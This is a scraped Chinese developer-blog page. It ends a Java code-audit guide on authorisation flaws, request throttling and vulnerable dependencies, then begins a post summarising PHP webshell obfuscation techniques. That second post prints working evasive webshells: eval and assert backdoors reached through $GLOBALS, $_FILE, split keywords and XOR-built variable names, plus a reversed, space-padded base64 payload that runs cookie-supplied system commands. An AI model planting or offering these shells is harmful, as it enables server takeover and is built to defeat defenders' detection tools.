<h5 id="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-7"><a href="#&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-7" class="headerlink" title="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;"></a>&#x5BA1;&#x8BA1;&#x51FD;&#x6570;</h5><p>&#x6C34;&#x5E73;&#x3001;&#x5782;&#x76F4;&#x8D8A;&#x6743;&#x4E0D;&#x9700;&#x5173;&#x6CE8;&#x7279;&#x5B9A;&#x51FD;&#x6570;&#xFF0C;&#x53EA;&#x8981;&#x5728;&#x5904;&#x7406;&#x7528;&#x6237;&#x64CD;&#x4F5C;&#x8BF7;&#x6C42;&#x65F6;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x5BF9;&#x5F53;&#x524D;&#x767B;&#x9646;&#x7528;&#x6237;&#x6743;&#x9650;&#x505A;&#x6821;&#x9A8C;&#x4ECE;&#x800C;&#x786E;&#x5B9A;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;</p>
<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-9"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-9" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><p>&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x767B;&#x9646;&#x7528;&#x6237;&#x5E76;&#x6821;&#x9A8C;&#x8BE5;&#x7528;&#x6237;&#x662F;&#x5426;&#x5177;&#x6709;&#x5F53;&#x524D;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#xFF0C;&#x5E76;&#x6821;&#x9A8C;&#x8BF7;&#x6C42;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x662F;&#x5426;&#x5C5E;&#x4E8E;&#x5F53;&#x524D;&#x767B;&#x9646;&#x7528;&#x6237;&#xFF0C;&#x5F53;&#x524D;&#x767B;&#x9646;&#x7528;&#x6237;&#x6807;&#x8BC6;&#x4E0D;&#x80FD;&#x4ECE;&#x7528;&#x6237;&#x53EF;&#x63A7;&#x7684;&#x8BF7;&#x6C42;&#x53C2;&#x6570;&#x4E2D;&#x83B7;&#x53D6;&#x3002;</p>
<h3 id="&#x6279;&#x91CF;&#x8BF7;&#x6C42;"><a href="#&#x6279;&#x91CF;&#x8BF7;&#x6C42;" class="headerlink" title="&#x6279;&#x91CF;&#x8BF7;&#x6C42;"></a>&#x6279;&#x91CF;&#x8BF7;&#x6C42;</h3><h5 id="&#x4ECB;&#x7ECD;-10"><a href="#&#x4ECB;&#x7ECD;-10" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>&#x4E1A;&#x52A1;&#x4E2D;&#x7ECF;&#x5E38;&#x4F1A;&#x6709;&#x4F7F;&#x7528;&#x5230;&#x53D1;&#x9001;&#x77ED;&#x4FE1;&#x6821;&#x9A8C;&#x7801;&#x3001;&#x77ED;&#x4FE1;&#x901A;&#x77E5;&#x3001;&#x90AE;&#x4EF6;&#x901A;&#x77E5;&#x7B49;&#x4E00;&#x4E9B;&#x529F;&#x80FD;&#xFF0C;&#x8FD9;&#x7C7B;&#x8BF7;&#x6C42;&#x5982;&#x679C;&#x4E0D;&#x505A;&#x4EFB;&#x4F55;&#x9650;&#x5236;&#xFF0C;&#x6076;&#x610F;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x80FD;&#x8FDB;&#x884C;&#x6279;&#x91CF;&#x6076;&#x610F;&#x8BF7;&#x6C42;&#x8F70;&#x70B8;&#xFF0C;&#x5927;&#x91CF;&#x77ED;&#x4FE1;&#x3001;&#x90AE;&#x4EF6;&#x7B49;&#x901A;&#x77E5;&#x5BF9;&#x6B63;&#x5E38;&#x7528;&#x6237;&#x9020;&#x6210;&#x56F0;&#x6270;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x662F;&#x5BF9;&#x516C;&#x53F8;&#x7684;&#x8D44;&#x6E90;&#x9020;&#x6210;&#x635F;&#x8017;&#x3002;</p>
<p>&#x9664;&#x4E86;&#x77ED;&#x4FE1;&#x3001;&#x90AE;&#x4EF6;&#x8F70;&#x70B8;&#x7B49;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x4E5F;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x7A0B;&#x5E8F;&#x4E2D;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x5F88;&#x591A;&#x63A5;&#x53E3;&#xFF0C;&#x7528;&#x6765;&#x67E5;&#x8BE2;&#x8D26;&#x53F7;&#x662F;&#x5426;&#x5B58;&#x5728;&#x3001;&#x8D26;&#x53F7;&#x540D;&#x4E0E;&#x624B;&#x673A;&#x6216;&#x90AE;&#x7BB1;&#x3001;&#x59D3;&#x540D;&#x7B49;&#x7684;&#x5339;&#x914D;&#x5173;&#x7CFB;&#xFF0C;&#x8FD9;&#x7C7B;&#x8BF7;&#x6C42;&#x5982;&#x4E0D;&#x505A;&#x9650;&#x5236;&#x4E5F;&#x4F1A;&#x88AB;&#x6076;&#x610F;&#x7528;&#x6237;&#x6279;&#x91CF;&#x5229;&#x7528;&#xFF0C;&#x4ECE;&#x800C;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x6570;&#x636E;&#x5173;&#x7CFB;&#x76F8;&#x5173;&#x6570;&#x636E;&#x3002;&#x5BF9;&#x8FD9;&#x7C7B;&#x8BF7;&#x6C42;&#x5728;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x65F6;&#x53EF;&#x5173;&#x6CE8;&#x662F;&#x5426;&#x6709;&#x5BF9;&#x8BF7;&#x6C42;&#x505A;&#x9274;&#x6743;&#x3001;&#x548C;&#x9650;&#x5236;&#x5373;&#x53EF;&#x5927;&#x81F4;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x98CE;&#x9669;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-10"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-10" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;    @RequestMapping(value=&quot;/ifUserExit&quot;,method = RequestMethod.GET)</span><br><span class="line">    public String ifUserExit(Model model, HttpServletRequest request) throws IOException {</span><br><span class="line">        String phone = request.getParameter(&quot;phone&quot;);</span><br><span class="line">        if(! phone.isEmpty()){</span><br><span class="line">            boolean ifex=userModel.ifuserExitByPhone(phone);</span><br><span class="line">            if (!ifex)</span><br><span class="line">                return &quot;&#x7528;&#x6237;&#x4E0D;&#x5B58;&#x5728;&quot;;</span><br><span class="line">        }</span><br><span class="line">        return &quot;&#x7528;&#x6237;&#x5DF2;&#x88AB;&#x6CE8;&#x518C;&quot;;</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>

<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-10"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-10" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><ul>
<li>&#x5BF9;&#x540C;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x53D1;&#x8D77;&#x8FD9;&#x7C7B;&#x8BF7;&#x6C42;&#x7684;&#x9891;&#x7387;&#x3001;&#x6BCF;&#x5C0F;&#x65F6;&#x53CA;&#x6BCF;&#x5929;&#x53D1;&#x9001;&#x91CF;&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x505A;&#x9650;&#x5236;&#xFF0C;&#x4E0D;&#x53EF;&#x5728;&#x524D;&#x7AEF;&#x5B9E;&#x73B0;&#x9650;&#x5236;</li>
</ul>
<h3 id="&#x7B2C;&#x4E09;&#x65B9;&#x7EC4;&#x4EF6;&#x5B89;&#x5168;"><a href="#&#x7B2C;&#x4E09;&#x65B9;&#x7EC4;&#x4EF6;&#x5B89;&#x5168;" class="headerlink" title="&#x7B2C;&#x4E09;&#x65B9;&#x7EC4;&#x4EF6;&#x5B89;&#x5168;"></a>&#x7B2C;&#x4E09;&#x65B9;&#x7EC4;&#x4EF6;&#x5B89;&#x5168;</h3><h5 id="&#x4ECB;&#x7ECD;-11"><a href="#&#x4ECB;&#x7ECD;-11" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>&#x8FD9;&#x4E2A;&#x6BD4;&#x8F83;&#x597D;&#x7406;&#x89E3;&#xFF0C;&#x8BF8;&#x5982;Struts2&#x3001;&#x4E0D;&#x5B89;&#x5168;&#x7684;&#x7F16;&#x8F91;&#x63A7;&#x4EF6;&#x3001;XML&#x89E3;&#x6790;&#x5668;&#x4EE5;&#x53CA;&#x53EF;&#x88AB;&#x5176;&#x5B83;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7684;&#x5982;commons-collections:3.1&#x7B49;&#x7B2C;&#x4E09;&#x65B9;&#x7EC4;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E2A;&#x53EF;&#x4EE5;&#x5728;&#x7A0B;&#x5E8F;pom&#x6587;&#x4EF6;&#x4E2D;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x5F15;&#x5165;&#x4F9D;&#x8D56;&#x3002;&#x5373;&#x4FBF;&#x5728;&#x4EE3;&#x7801;&#x4E2D;&#x6CA1;&#x6709;&#x5E94;&#x7528;&#x5230;&#x6216;&#x5F88;&#x96BE;&#x76F4;&#x63A5;&#x5229;&#x7528;&#xFF0C;&#x4E5F;&#x4E0D;&#x5E94;&#x8BE5;&#x4F7F;&#x7528;&#x4E0D;&#x5B89;&#x5168;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x4E00;&#x4E2A;&#x4EA7;&#x54C1;&#x7684;&#x5468;&#x671F;&#x5F88;&#x957F;&#xFF0C;&#x5F88;&#x96BE;&#x4FDD;&#x8BC1;&#x540E;&#x9762;&#x4E0D;&#x4F1A;&#x5F15;&#x5165;&#x53EF;&#x88AB;&#x5229;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x70B9;&#x3002;</p>
<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-11"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-11" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><ul>
<li>&#x4F7F;&#x7528;&#x6700;&#x65B0;&#x6216;&#x5B89;&#x5168;&#x7248;&#x672C;&#x7684;&#x7B2C;&#x4E09;&#x65B9;&#x7EC4;&#x4EF6;</li>
</ul>
<h3 id="&#x5F85;&#x7EED;&#x2026;"><a href="#&#x5F85;&#x7EED;&#x2026;" class="headerlink" title="&#x5F85;&#x7EED;&#x2026;"></a>&#x5F85;&#x7EED;&#x2026;</h3><h3 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h3><p>&#x9664;&#x4E86;&#x4E0A;&#x8FF0;&#x76F8;&#x5173;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x5728;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x7684;&#x65F6;&#x5019;&#x6709;&#x65F6;&#x4F1A;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x7279;&#x522B;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x6BD4;&#x5982;&#x5F00;&#x53D1;&#x4E3A;&#x4E86;&#x6D4B;&#x8BD5;&#x65B9;&#x4FBF;&#x5173;&#x95ED;&#x6389;&#x4E86;&#x4E00;&#x4E9B;&#x5B89;&#x5168;&#x6821;&#x9A8C;&#x51FD;&#x6570;&#x3001;&#x751A;&#x81F3;&#x672A;&#x5F7B;&#x5E95;&#x6E05;&#x9664;&#x7684;&#x4E00;&#x4E9B;&#x9884;&#x7559;&#x540E;&#x95E8;&#x53CA;&#x6D4B;&#x8BD5;&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x7B49;&#x3002;&#x9664;&#x6B64;&#xFF0C;&#x6846;&#x67B6;&#x672C;&#x8EAB;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x6DF1;&#x6316;&#x3002;&#x4E00;&#x4E9B;&#x5B89;&#x5168;&#x6821;&#x9A8C;&#x3001;&#x5B89;&#x5168;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x4E5F;&#x672A;&#x5FC5;&#x5C31;&#x6BEB;&#x65E0;&#x7834;&#x7EFD;&#x7684;&#xFF0C;&#x5373;&#x4FBF;&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x5B89;&#x5168;&#x89E3;&#x51B3;&#xFF0C;&#x4F46;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x6709;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x4EE5;&#x53CA;&#x662F;&#x5426;&#x6B63;&#x786E;&#x4F7F;&#x7528;&#x5B89;&#x5168;&#x65B9;&#x6848;&#x90FD;&#x662F;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x95EE;&#x9898;&#x7684;&#x70B9;&#x3002;&#x5927;&#x516C;&#x53F8;&#x90FD;&#x6709;&#x6210;&#x719F;&#x7684;&#x6846;&#x67B6;&#xFF0C;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x5E76;&#x4E0D;&#x662F;&#x592A;&#x591A;&#xFF0C;&#x4F46;&#x8BBE;&#x8BA1;&#x5C42;&#x9762;&#x4E0A;&#x7684;&#x5B89;&#x5168;&#x53CA;&#x6D41;&#x7A0B;&#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898;&#x5374;&#x57FA;&#x672C;&#x4F9D;&#x8D56;&#x5F00;&#x53D1;&#x7684;&#x7ECF;&#x9A8C;&#x3002;&#x6D41;&#x7A0B;&#x76F8;&#x5173;&#x7684;&#x6F0F;&#x6D1E;&#x5219;&#x6709;&#x5FC5;&#x8981;&#x5148;&#x719F;&#x6089;&#x5E94;&#x7528;&#x672C;&#x8EAB;&#x7684;&#x8BBE;&#x8BA1;&#x548C;&#x903B;&#x8F91;&#xFF0C;&#x8FD9;&#x5757;&#x4E5F;&#x662F;&#x6F5C;&#x5728;&#x7684;&#x98CE;&#x9669;&#x70B9;&#x3002;</p>
<p>&#x4E0D;&#x8981;&#x6307;&#x671B;&#x7ED9;&#x5F00;&#x53D1;&#x8BF4;&#x4E00;&#x53E5;&#x201C;&#x4E00;&#x5207;&#x8F93;&#x5165;&#x90FD;&#x662F;&#x4E0D;&#x53EF;&#x4FE1;&#x7684;&#x201D;&#xFF0C;&#x4ED6;&#x5C31;&#x80FD;&#x7F16;&#x5199;&#x51FA;&#x5B89;&#x5168;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x603B;&#x4E4B;,Talk is cheap. Show me the code&#xFF5E;</p>
<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/882e579f321567192f3e4d61fe54374a.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903520190070797.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903520190070797.html" itemprop="url">PHP WebShell变形技术总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T14:42:29+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="&#x7B80;&#x4ECB;"><a href="#&#x7B80;&#x4ECB;" class="headerlink" title="&#x7B80;&#x4ECB;"></a>&#x7B80;&#x4ECB;</h2><p><strong>WebShell&#x7684;&#x53D8;&#x5F62;&#x6280;&#x672F;&#x4E0E;&#x5404;&#x79CD;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x7684;&#x68C0;&#x6D4B;&#x65B9;&#x6CD5;&#x4E00;&#x76F4;&#x90FD;&#x5728;&#x76F8;&#x4E92;&#x5BF9;&#x6297;&#xFF0C;&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x5C31;&#x5BF9;&#x76EE;&#x524D;&#x5E38;&#x89C1;&#x7684;WebShell&#x7684;&#x53D8;&#x5F62;&#x6280;&#x672F;&#x8FDB;&#x884C;&#x603B;&#x7ED3;&#x3002;</strong></p>
<p>&#x76EE;&#x524D;&#x7684;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x5BF9;&#x80FD;&#x591F;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x51FD;&#x6570;&#x548C;&#x80FD;&#x591F;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x7684;&#x51FD;&#x6570;&#x90FD;&#x4F1A;&#x683C;&#x5916;&#x7684;&#x654F;&#x611F;&#xFF0C;&#x5982;<code>eavl</code>&#x3001;<code>assert</code>&#x3001;<code>system</code>&#x3001;<code>popen</code>&#x3001;<code>shell_exec</code>&#xFF0C;&#x6240;&#x4EE5;&#x50CF;&#x6700;&#x4E3A;&#x7B80;&#x5355;&#x7684;<code>eval($_POST[cmd])</code>&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x5C31;&#x4E00;&#x5B9A;&#x4F1A;&#x88AB;&#x67E5;&#x6740;&#x3002;&#x6240;&#x4EE5;&#x76EE;&#x524D;&#x7684;&#x53D8;&#x5F62;&#x7684;&#x672C;&#x8D28;&#x90FD;&#x5728;&#x4E8E;&#x5982;&#x4F55;&#x9690;&#x85CF;&#x81EA;&#x5DF1;&#x7684;&#x654F;&#x611F;&#x51FD;&#x6570;&#x3002;</p>
<h2 id="&#x5DE7;&#x7528;-GPC"><a href="#&#x5DE7;&#x7528;-GPC" class="headerlink" title="&#x5DE7;&#x7528;$GPC"></a>&#x5DE7;&#x7528;$GPC</h2><h3 id="&#x5229;&#x7528;-GLOBALS"><a href="#&#x5229;&#x7528;-GLOBALS" class="headerlink" title="&#x5229;&#x7528;$GLOBALS"></a>&#x5229;&#x7528;$GLOBALS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;@eval($GLOBALS[&apos;_POST&apos;][&apos;op&apos;]);</span><br></pre></td></tr></table></figure>

<p>&#x5F88;&#x591A;&#x7684;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x68C0;&#x67E5;<code>$_POST</code>&#xFF0C;&#x6240;&#x4EE5;&#x901A;&#x8FC7;<code>$GLOBALS</code>&#x5C31;&#x80FD;&#x591F;&#x9003;&#x8FC7;&#x67E5;&#x6740;&#x3002;</p>
<h3 id="&#x5229;&#x7528;-FILE"><a href="#&#x5229;&#x7528;-FILE" class="headerlink" title="&#x5229;&#x7528;$_FILE"></a>&#x5229;&#x7528;$_FILE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;@eval($_FILE[&apos;name&apos;]);</span><br></pre></td></tr></table></figure>

<p>&#x4F7F;&#x7528;<code>$_FILE</code>&#x5C31;&#x80FD;&#x591F;&#x9003;&#x8131;&#x5F88;&#x591A;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x4E86;&#x3002;</p>
<h2 id="&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;"><a href="#&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;" class="headerlink" title="&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;"></a>&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;</h2><h3 id="&#x654F;&#x611F;&#x51FD;&#x6570;&#x62C6;&#x5206;"><a href="#&#x654F;&#x611F;&#x51FD;&#x6570;&#x62C6;&#x5206;" class="headerlink" title="&#x654F;&#x611F;&#x51FD;&#x6570;&#x62C6;&#x5206;"></a>&#x654F;&#x611F;&#x51FD;&#x6570;&#x62C6;&#x5206;</h3><p>&#x7531;&#x4E8E;PHP&#x8BED;&#x6CD5;&#x7684;&#x7075;&#x6D3B;&#x6027;&#xFF0C;&#x8FD9;&#x79CD;&#x5199;&#x6CD5;&#x5C31;&#x4F1A;&#x6709;&#x5F88;&#x591A;&#x4E86;&#x3002;&#x6BD4;&#x5982;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$k=&quot;ass&quot;.&quot;ert&quot;; $k(${&quot;_PO&quot;.&quot;ST&quot;} [&apos;sz&apos;]);</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x79CD;&#x5C31;&#x662F;&#x5229;&#x7528;PHP&#x7684;&#x53EF;&#x53D8;&#x51FD;&#x6570;&#x6765;&#x62C6;&#x5206;<code>assert</code>&#x5173;&#x952E;&#x5B57;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x62C6;&#x5206;&#x65B9;&#x5F0F;&#x4E5F;&#x6BD4;&#x8F83;&#x7684;&#x7B80;&#x5355;&#xFF0C;&#x76EE;&#x524D;&#x7684;&#x9632;&#x62A4;&#x8F6F;&#x4EF6;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x8BC6;&#x522B;&#x4E86;&#x3002;</p>
<p>&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E5F;&#x53EF;&#x4EE5;&#x53D8;&#x5F62;&#x4E00;&#x4E0B;&#xFF0C;&#x5C06;<code>assert</code>&#x653E;&#x7F6E;&#x5728;&#x51FD;&#x6570;&#x91CC;&#x9762;&#x3002;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;function func() {</span><br><span class="line">    return &quot;ass&quot;.&quot;ert&quot;;</span><br><span class="line">}</span><br><span class="line">$a = func();</span><br><span class="line">$a(${&quot;_PO&quot;.&quot;ST&quot;}[&apos;sz&apos;]);</span><br></pre></td></tr></table></figure>

<p>&#x57FA;&#x4E8E;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x8FD8;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x66F4;&#x591A;&#x7684;&#x53D8;&#x5F62;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8FDB;&#x884C;&#x8BF4;&#x660E;&#x4E86;&#x3002;</p>
<h3 id="&#x7A7A;&#x683C;&#x66FF;&#x6362;-amp-&#x5B57;&#x7B26;&#x4E32;&#x66FF;&#x6362;"><a href="#&#x7A7A;&#x683C;&#x66FF;&#x6362;-amp-&#x5B57;&#x7B26;&#x4E32;&#x66FF;&#x6362;" class="headerlink" title="&#x7A7A;&#x683C;&#x66FF;&#x6362;&amp;&#x5B57;&#x7B26;&#x4E32;&#x66FF;&#x6362;"></a>&#x7A7A;&#x683C;&#x66FF;&#x6362;&amp;&#x5B57;&#x7B26;&#x4E32;&#x66FF;&#x6362;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&lt;?php $b=strrev(&quot;edoced_4&quot;.&quot;6esab&quot;);eval($b(str_replace(&quot; &quot;,&quot;&quot;,&quot;a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = &quot;)));?&gt;</span><br></pre></td></tr></table></figure>

<p>&#x9996;&#x5148;&#x5C06;&#x5173;&#x952E;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x5012;&#x8F6C;&#x548C;&#x7A7A;&#x683C;&#xFF0C;&#x4E4B;&#x540E;&#x5229;&#x7528;<code>strrev</code>&#x548C;<code>str_replace</code>&#x6062;&#x590D;&#x3002;&#x4E0D;&#x540C;&#x4E8E;&#x4E4B;&#x524D;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x91C7;&#x7528;&#x7684;&#x662F;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;&#x5404;&#x79CD;&#x53D8;&#x5F62;&#x8FBE;&#x5230;&#x9690;&#x85CF;&#x654F;&#x611F;&#x51FD;&#x6570;&#x7684;&#x76EE;&#x7684;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x80FD;&#x591F;&#x6709;&#x6548;&#x5730;&#x8EB2;&#x907F;&#x67E5;&#x6740;&#x3002;</p>
<h2 id="&#x7279;&#x6B8A;&#x5B57;&#x7B26;"><a href="#&#x7279;&#x6B8A;&#x5B57;&#x7B26;" class="headerlink" title="&#x7279;&#x6B8A;&#x5B57;&#x7B26;"></a>&#x7279;&#x6B8A;&#x5B57;&#x7B26;</h2><p>&#x8FD9;&#x79CD;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x7EC4;&#x6210;&#x7684;webshell&#x5176;&#x5B9E;&#x4E5F;&#x7B97;&#x662F;<strong>&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;</strong>&#x4E2D;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x7531;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x4E32;&#x7EC4;&#x6210;&#x7684;webshell&#x7ECF;&#x5E38;&#x88AB;&#x8BA8;&#x8BBA;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x5355;&#x72EC;&#x4F5C;&#x4E3A;&#x4E00;&#x5C0F;&#x8282;&#x8FDB;&#x884C;&#x8BF4;&#x660E;&#x3002;</p>
<h3 id="&#x8FDB;&#x5236;&#x8FD0;&#x7B97;"><a href="#&#x8FDB;&#x5236;&#x8FD0;&#x7B97;" class="headerlink" title="&#x8FDB;&#x5236;&#x8FD0;&#x7B97;"></a>&#x8FDB;&#x5236;&#x8FD0;&#x7B97;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;@$_++;</span><br><span class="line"></span><br><span class="line">$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);         // $__&#x7684;&#x503C;&#x4E3A;_POST</span><br><span class="line"></span><br><span class="line">@${$__}[!$_](${$__}[$_]);</span><br></pre></td></tr></table></figure>

